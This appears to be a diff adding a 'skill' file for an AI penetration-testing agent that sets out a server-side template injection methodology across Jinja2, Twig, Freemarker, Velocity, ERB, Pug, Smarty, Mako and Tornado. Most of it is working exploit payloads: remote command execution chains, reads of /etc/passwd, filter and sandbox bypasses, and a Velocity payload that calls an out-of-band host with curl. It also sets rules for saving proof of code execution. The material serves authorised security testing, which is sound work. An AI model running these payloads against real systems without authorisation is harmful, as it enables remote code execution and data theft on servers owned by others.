@@ -1,0 +1,211 @@
+---
+name: cypher-ssti
+description: Server-Side Template Injection methodology covering Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Jade/Pug, Mustache/Handlebars, and .NET Razor engines with detection, identification, and exploitation workflows.
+version: 0.1.0
+owasp: [A03:2021-Injection]
+cwe: [CWE-94, CWE-1336]
+finding_types: [PARAMETER, VULN_CANDIDATE, EXPLOIT_RESULT, SESSION]
+destructiveness: high
+tags: [web, ssti, rce, template-injection]
+---
+
+# Cypher SSTI Skill
+
+Use this skill when the application renders user input inside a server-side template: email templates, report generators, error pages, profile fields, or any parameter that is formatted with template syntax before display.
+
+## Detection
+
+1. Inject template expressions in every user input that might be rendered:
+   ```
+   {{7*7}}
+   ${7*7}
+   #{7*7}
+   <%= 7*7 %>
+   {{7*'7'}}
+   ${{7*7}}
+   @(7*7)
+   ```
+2. If the output contains `49` (or `7777777` for string multiplication), SSTI is confirmed.
+3. If the output contains `{{7*7}}` verbatim, the input is echoed but not evaluated — likely safe (unless the engine uses a different syntax).
+4. When a template syntax is confirmed, identify the engine from the syntax or error messages.
+
+## Engine identification
+
+| Engine | Language | Syntax | RCE Complexity |
+|--------|----------|--------|----------------|
+| Jinja2 / Flask | Python | `{{ expr }}`, `{% stmt %}` | Medium |
+| Django Template | Python | `{{ var }}`, `{% tag %}` | Hard (sandboxed by design) |
+| Twig | PHP | `{{ var }}`, `{% set %}` | Medium |
+| Smarty | PHP | `{$var}`, `{php}...{/php}` | Easy (if {php} enabled) |
+| Freemarker | Java | `${expr}`, `<#...>` | Easy |
+| Velocity | Java | `$var`, `#set`, `#if` | Medium |
+| Thymeleaf | Java | `${expr}`, `*{expr}`, `__${...}__` | Medium |
+| ERB | Ruby | `<%= expr %>`, `<% code %>` | Easy |
+| Slim | Ruby | `#{expr}` | Easy |
+| Jade / Pug | Node.js | `#{expr}`, `!{expr}` | Medium |
+| Handlebars | Node.js | `{{expr}}` | Hard (logic-less) |
+| EJS | Node.js | `<%= expr %>` | Medium |
+| Razor | .NET | `@expr`, `@(expr)` | Medium |
+| Mako | Python | `${expr}`, `<% code %>` | Easy |
+| Tornado | Python | `{{ expr }}` | Medium |
+
+## Jinja2 (Python / Flask)
+
+### Object chain to RCE
+```
+{{ config }}
+{{ config.items() }}
+{{ self.__init__.__globals__['os'].popen('id').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+### Common Jinja2 RCE payloads
+```python
+# Via __globals__
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__["os"].popen('id').read() }}
+
+# Via __subclasses__ (search for subprocess.Popen or os._wrap_close)
+{{ ''.__class__.__mro__[1].__subclasses__() }}  # list all, find Popen index
+{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
+
+# Via __builtins__
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+### Jinja2 filters bypass
+- Blacklisted chars: use `|attr()`, `request|attr('application')`
+- Blacklisted quotes: use `request.args.x` for parameter-based payload injection:
+  ```
+  {{ lipsum|attr(request.args.a) }}&a=__globals__
+  ```
+- Blacklisted dots/brackets: `|attr()` chain instead of direct attribute access.
+
+## Twig (PHP)
+
+### Detection → RCE
+```twig
+{{ 7*7 }}
+{{ _self }}
+{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
+{{ ['id']|map('system')|join }}
+{{ {'pwnd': 'id'}|map('system')|join }}
+```
+
+### Twig sandbox bypass
+```twig
+{{ include('/etc/passwd') }}
+{{ source('/etc/passwd') }}
+{% set pwn = include(template_from_string('{{ include(var) }}')) %}
+```
+
+## Freemarker (Java)
+
+```freemarker
+${7*7}
+${"freemarker".toUpperCase()}
+# RCE:
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+# File read:
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd")}
+```
+
+## Velocity (Java)
+
+```velocity
+#set($s="")
+#set($class=$s.getClass())
+#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
+$runtime.exec("curl http://<dnslog>/velocity")
+```
+
+## ERB (Ruby)
+
+```erb
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= File.read('/etc/passwd') %>
+<%= Dir.entries('/') %>
+```
+
+## Pug / Jade (Node.js)
+
+```pug
+#{7*7}
+#{function(){ return global.process.mainModule.require('child_process').execSync('id').toString() }()}
+```
+
+## Smarty (PHP)
+
+```smarty
+{$smarty.version}
+{php}echo shell_exec('id');{/php}
+{if system('id')}{/if}
+```
+
+## Django Template (Python)
+
+Django templates are sandboxed and do NOT allow arbitrary Python execution by default. However, custom template tags/filters may expose dangerous functions. Check for:
+- `{% debug %}`
+- `{% load ... %}` with custom libraries
+- `{% include %}` with user-controllable paths
+- `{% extends %}` with user-controlled parent
+
+## Mako (Python)
+
+```mako
+${7*7}
+<%
+import os
+os.system('id')
+%>
+```
+
+## Tornado
+
+```python
+{{ 7*7 }}
+{{ handler.settings }}
+{% import os %}{{ os.popen('id').read() }}
+```
+
+## Bypass techniques
+
+### Character filtering
+- `{{` blocked: try `{%` with `print()` or `{{` encoded as `&#123;&#123;` (sometimes decoded before template eval)
+- `.` blocked: use `|attr()` in Jinja2, `['key']` in others
+- `_` blocked: use `\x5f`, `|attr('\x5f\x5fglobals\x5f\x5f')`
+- Keywords blocked: use hex encoding, string concatenation, request params
+
+### Sandbox escape (Jinja2)
+- Python's MRO (Method Resolution Order) chain: `''.__class__.__mro__[1].__subclasses__()`
+- Walk up to `object`, then down to any dangerous class
+- Common targets: `subprocess.Popen`, `os._wrap_close`, `warnings.catch_warnings`
+
+## Evidence rules
+
+- Save the working SSTI payload to `/mnt/project/exploit/ssti-<param>/payload.txt`.
+- If RCE is achieved, capture `whoami`/`id` output to `/mnt/project/exploit/ssti-<param>/rce-proof.txt`.
+- Document the template engine and version, and the exact payload that worked.
+- For sandboxed engines (Django, Handlebars), document the limitation even if no RCE is achieved — SSRF, file read, or information disclosure may still be possible.
+
+## Prefix examples
+
+```text
+[cypher:finding type=VULN_CANDIDATE confidence=0.93 severity=high tags=web,ssti,jinja2 artifacts=/mnt/project/exploit/ssti-email-template/ cleanup=none] SSTI confirmed in email template preview — `{{7*7}}` renders `49`. Engine: Jinja2 (Flask app). RCE test pending.
+```
+
+```text
+[cypher:finding type=EXPLOIT_RESULT confidence=0.99 severity=critical tags=web,ssti,rce artifacts=/mnt/project/exploit/ssti-email-template/payload.txt,/mnt/project/exploit/ssti-email-template/rce-proof.txt cleanup=none] Jinja2 SSTI in POST /preview achieves RCE as `www-data` via `lipsum.__globals__['os'].popen('id').read()`. Full application source code readable.
+```
+
+## Common false positives
+
+- `{{7*7}}` showing `49` in a client-side framework (Vue.js, Angular, React) — these use similar `{{}}` syntax but are evaluated in the browser, not the server. Test by disabling JavaScript or checking the raw HTML response.
+- Template rendering is server-side but the engine is intentionally sandboxed (Django, Handlebars). Document the finding as an injection vector with limited impact.
+- The expression is evaluated but the output is encoded/escaped — the payload may work but the output is invisible. Switch to time-based or OOB payloads.
